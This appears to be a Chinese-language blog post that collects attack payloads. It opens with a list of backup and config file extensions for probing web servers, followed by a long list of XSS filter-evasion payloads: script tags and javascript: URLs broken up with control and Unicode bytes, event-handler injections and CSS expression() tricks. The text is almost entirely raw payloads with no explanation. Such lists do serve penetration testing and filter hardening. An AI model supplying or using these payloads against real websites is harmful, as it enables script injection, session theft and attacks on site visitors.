    <title><![CDATA[Payload收集]]></title>
    <url>%2F2019%2F02%2F02%2FPayload%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[先收集一波Payload 扩展名123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168001002127zZbackbackupbakbakupbasbz2cconfcopiacorecppdatdbdefaultdlldocinijarjavaoldorigpasrarsavsavedsourcesrcstackdumptartargztemptesttgztmptxtwarzip~aspaspxphpphp3php4php5txtshtmshtmlphtmphtmljhtmlpljspcfmcfmlpyrbcfgzippdfgztartar.gztgzdocdocxxlsxlsxconf7zasmxaspaspxbakbatbinbz2ccccfgcfmcgiclasscnfconfconfigcppcscsvdatdbdlldodocdumpeperrerrorexegifgzhtmhtmlincinijavajhtmljpgjsjsfjspkeylibloglstmanifestmdbmetamsgnsfooldoraorigoutpartpdfphpphp3phtmlplpmpngpptpropertiespyrarrssrtfsaveshshtmlsvgsosqlstackdumpswftartar.bz2tar.gztemptesttgztmptracetxtvbvbswsxlsxmlxslzip XSS123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705&lt;script\x20type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x3Etype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x0Dtype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x09type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x0Ctype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x2Ftype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x0Atype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&apos;`&quot;&gt;&lt;\x3Cscript&gt;javascript:alert(1)&lt;/script&gt; &apos;`&quot;&gt;&lt;\x00script&gt;javascript:alert(1)&lt;/script&gt;&lt;img src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/img&gt;&lt;audio src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/audio&gt;&lt;video src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/video&gt;&lt;body src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/body&gt;&lt;image src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/image&gt;&lt;object src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/object&gt;&lt;script src=1 href=1 onerror=&quot;javascript:alert(1)&quot;&gt;&lt;/script&gt;&lt;svg onResize svg onResize=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onResize&gt;&lt;title onPropertyChange title onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/title onPropertyChange&gt;&lt;iframe onLoad iframe onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onLoad&gt;&lt;body onMouseEnter body onMouseEnter=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onMouseEnter&gt;&lt;body onFocus body onFocus=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onFocus&gt;&lt;frameset onScroll frameset onScroll=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/frameset onScroll&gt;&lt;script onReadyStateChange script onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/script onReadyStateChange&gt;&lt;html onMouseUp html onMouseUp=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseUp&gt;&lt;body onPropertyChange body onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPropertyChange&gt;&lt;svg onLoad svg onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onLoad&gt;&lt;body onPageHide body onPageHide=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPageHide&gt;&lt;body onMouseOver body onMouseOver=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onMouseOver&gt;&lt;body onUnload body onUnload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onUnload&gt;&lt;body onLoad body onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onLoad&gt;&lt;bgsound onPropertyChange bgsound onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/bgsound onPropertyChange&gt;&lt;html onMouseLeave html onMouseLeave=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseLeave&gt;&lt;html onMouseWheel html onMouseWheel=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseWheel&gt;&lt;style onLoad style onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/style onLoad&gt;&lt;iframe onReadyStateChange iframe onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onReadyStateChange&gt;&lt;body onPageShow body onPageShow=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPageShow&gt;&lt;style onReadyStateChange style onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/style onReadyStateChange&gt;&lt;frameset onFocus frameset onFocus=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/frameset onFocus&gt;&lt;applet onError applet onError=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onError&gt;&lt;marquee onStart marquee onStart=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/marquee onStart&gt;&lt;script onLoad script onLoad=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/script onLoad&gt;&lt;html onMouseOver html onMouseOver=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseOver&gt;&lt;html onMouseEnter html onMouseEnter=&quot;javascript:parent.javascript:alert(1)&quot;&gt;&lt;/html onMouseEnter&gt;&lt;body onBeforeUnload body onBeforeUnload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onBeforeUnload&gt;&lt;html onMouseDown html onMouseDown=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseDown&gt;&lt;marquee onScroll marquee onScroll=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/marquee onScroll&gt;&lt;xml onPropertyChange xml onPropertyChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/xml onPropertyChange&gt;&lt;frameset onBlur frameset onBlur=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/frameset onBlur&gt;&lt;applet onReadyStateChange applet onReadyStateChange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onReadyStateChange&gt;&lt;svg onUnload svg onUnload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onUnload&gt;&lt;html onMouseOut html onMouseOut=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseOut&gt;&lt;body onMouseMove body onMouseMove=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onMouseMove&gt;&lt;body onResize body onResize=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onResize&gt;&lt;object onError object onError=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/object onError&gt;&lt;body onPopState body onPopState=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onPopState&gt;&lt;html onMouseMove html onMouseMove=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onMouseMove&gt;&lt;applet onreadystatechange applet onreadystatechange=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onreadystatechange&gt;&lt;body onpagehide body onpagehide=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onpagehide&gt;&lt;svg onunload svg onunload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onunload&gt;&lt;applet onerror applet onerror=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/applet onerror&gt;&lt;body onkeyup body onkeyup=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onkeyup&gt;&lt;body onunload body onunload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onunload&gt;&lt;iframe onload iframe onload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onload&gt;&lt;body onload body onload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onload&gt;&lt;html onmouseover html onmouseover=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onmouseover&gt;&lt;object onbeforeload object onbeforeload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/object onbeforeload&gt;&lt;body onbeforeunload body onbeforeunload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onbeforeunload&gt;&lt;body onfocus body onfocus=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onfocus&gt;&lt;body onkeydown body onkeydown=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onkeydown&gt;&lt;iframe onbeforeload iframe onbeforeload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe onbeforeload&gt;&lt;iframe src iframe src=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/iframe src&gt;&lt;svg onload svg onload=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/svg onload&gt;&lt;html onmousemove html onmousemove=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/html onmousemove&gt;&lt;body onblur body onblur=&quot;javascript:javascript:alert(1)&quot;&gt;&lt;/body onblur&gt;\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;&apos;&quot;`&gt;&lt;script&gt;/* *\x2Fjavascript:alert(1)// */&lt;/script&gt;&lt;script&gt;javascript:alert(1)&lt;/script\x0D&lt;script&gt;javascript:alert(1)&lt;/script\x0A&lt;script&gt;javascript:alert(1)&lt;/script\x0B&lt;script charset=&quot;\x22&gt;javascript:alert(1)&lt;/script&gt;&lt;!--\x3E&lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;--&gt;&lt;!-- ---&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;--&gt;&lt;!-- --\x00&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;--&gt;&lt;!-- --\x21&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;--&gt;&lt;!-- --\x3E&gt; &lt;img src=xxx:x onerror=javascript:alert(1)&gt; --&gt;`&quot;&apos;&gt;&lt;img src=&apos;#\x27 onerror=javascript:alert(1)&gt;&lt;a href=&quot;javascript\x3Ajavascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&quot;&apos;`&gt;&lt;p&gt;&lt;svg&gt;&lt;script&gt;a=&apos;hello\x27;javascript:alert(1)//&apos;;&lt;/script&gt;&lt;/p&gt;&lt;a href=&quot;javas\x00cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x07cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x0Dcript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x0Acript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x08cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x02cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x03cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x04cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x01cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x05cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x0Bcript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x09cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x06cript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javas\x0Ccript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;script&gt;/* *\x2A/javascript:alert(1)// */&lt;/script&gt;&lt;script&gt;/* *\x00/javascript:alert(1)// */&lt;/script&gt;&lt;style&gt;&lt;/style\x3E&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;&lt;style&gt;&lt;/style\x0D&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;&lt;style&gt;&lt;/style\x09&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;&lt;style&gt;&lt;/style\x20&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;&lt;style&gt;&lt;/style\x0A&lt;img src=&quot;about:blank&quot; onerror=javascript:alert(1)//&gt;&lt;/style&gt;&quot;&apos;`&gt;ABC&lt;div style=&quot;font-family:&apos;foo&apos;\x7Dx:expression(javascript:alert(1);/*&apos;;&quot;&gt;DEF&quot;&apos;`&gt;ABC&lt;div style=&quot;font-family:&apos;foo&apos;\x3Bx:expression(javascript:alert(1);/*&apos;;&quot;&gt;DEF&lt;script&gt;if(&quot;x\\xE1\x96\x89&quot;.length==2) &#123; javascript:alert(1);&#125;&lt;/script&gt;&lt;script&gt;if(&quot;x\\xE0\xB9\x92&quot;.length==2) &#123; javascript:alert(1);&#125;&lt;/script&gt;&lt;script&gt;if(&quot;x\\xEE\xA9\x93&quot;.length==2) &#123; javascript:alert(1);&#125;&lt;/script&gt;&apos;`&quot;&gt;&lt;\x3Cscript&gt;javascript:alert(1)&lt;/script&gt;&apos;`&quot;&gt;&lt;\x00script&gt;javascript:alert(1)&lt;/script&gt;&quot;&apos;`&gt;&lt;\x3Cimg src=xxx:x onerror=javascript:alert(1)&gt;&quot;&apos;`&gt;&lt;\x00img src=xxx:x onerror=javascript:alert(1)&gt;&lt;script src=&quot;data:text/plain\x2Cjavascript:alert(1)&quot;&gt;&lt;/script&gt;&lt;script src=&quot;data:\xD4\x8F,javascript:alert(1)&quot;&gt;&lt;/script&gt;&lt;script src=&quot;data:\xE0\xA4\x98,javascript:alert(1)&quot;&gt;&lt;/script&gt;&lt;script src=&quot;data:\xCB\x8F,javascript:alert(1)&quot;&gt;&lt;/script&gt;&lt;script\x20type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x3Etype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x0Dtype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x09type=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x0Ctype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x2Ftype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;&lt;script\x0Atype=&quot;text/javascript&quot;&gt;javascript:alert(1);&lt;/script&gt;ABC&lt;div style=&quot;x\x3Aexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:expression\x5C(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:expression\x00(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:exp\x00ression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:exp\x5Cression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\x0Aexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\x09expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE3\x80\x80expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x84expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xC2\xA0expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x80expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x8Aexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\x0Dexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\x0Cexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x87expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xEF\xBB\xBFexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\x20expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x88expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\x00expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x8Bexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x86expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x85expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x82expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\x0Bexpression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x81expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x83expression(javascript:alert(1)&quot;&gt;DEFABC&lt;div style=&quot;x:\xE2\x80\x89expression(javascript:alert(1)&quot;&gt;DEF&lt;a href=&quot;\x0Bjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x0Fjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xC2\xA0javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x05javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE1\xA0\x8Ejavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x18javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x11javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\x88javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\x89javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\x80javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x17javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x03javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x0Ejavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x1Ajavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x00javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x10javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\x82javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x20javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x13javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x09javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\x8Ajavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x14javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x19javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\xAFjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x1Fjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\x81javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x1Djavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\x87javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x07javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE1\x9A\x80javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\x83javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x04javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x01javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x08javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\x84javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\x86javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE3\x80\x80javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x12javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x0Djavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x0Ajavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x0Cjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x15javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\xA8javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x16javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x02javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x1Bjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x06javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\xA9javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x80\x85javascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x1Ejavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\xE2\x81\x9Fjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;\x1Cjavascript:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javascript\x00:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javascript\x3A:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javascript\x09:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javascript\x0D:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;&lt;a href=&quot;javascript\x0A:javascript:alert(1)&quot; id=&quot;fuzzelement1&quot;&gt;test&lt;/a&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \x0Aonerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \x22onerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \x0Bonerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \x0Donerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \x2Fonerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \x09onerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \x0Conerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \x00onerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \x27onerror=javascript:alert(1)&gt;`&quot;&apos;&gt;&lt;img src=xxx:x \x20onerror=javascript:alert(1)&gt;&quot;`&apos;&gt;&lt;script&gt;\x3Bjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\x0Djavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xEF\xBB\xBFjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x81javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x84javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE3\x80\x80javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\x09javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x89javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x85javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x88javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\x00javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\xA8javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\x8Ajavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE1\x9A\x80javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\x0Cjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\x2Bjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xF0\x90\x96\x9Ajavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;-javascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\x0Ajavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\xE2\x80\xAFjavascript:alert(1)&lt;/script&gt;&quot;`&apos;&gt;&lt;script&gt;\x7Ejavascript:alert(1)&lt;/script&gt;&quot;`&a